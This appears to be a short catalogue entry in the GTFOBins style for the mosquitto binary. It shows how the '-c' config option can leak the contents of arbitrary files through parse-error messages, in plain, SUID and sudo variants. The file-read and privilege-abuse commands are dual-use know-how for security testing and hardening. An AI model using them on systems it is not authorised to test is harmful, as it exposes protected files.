---
description: The file is actually parsed and the first wrong line (ending with a newline or a null character) is returned in an error message, thus it may not be suitable for reading arbitrary files
functions:
  file-read:
    - code: |
        LFILE=file_to_read
        mosquitto -c "$LFILE"
  suid:
    - code: |
        LFILE=file_to_read
        ./mosquitto -c "$LFILE"
  sudo:
    - code: |
        LFILE=file_to_read
        sudo mosquitto -c "$LFILE"
---
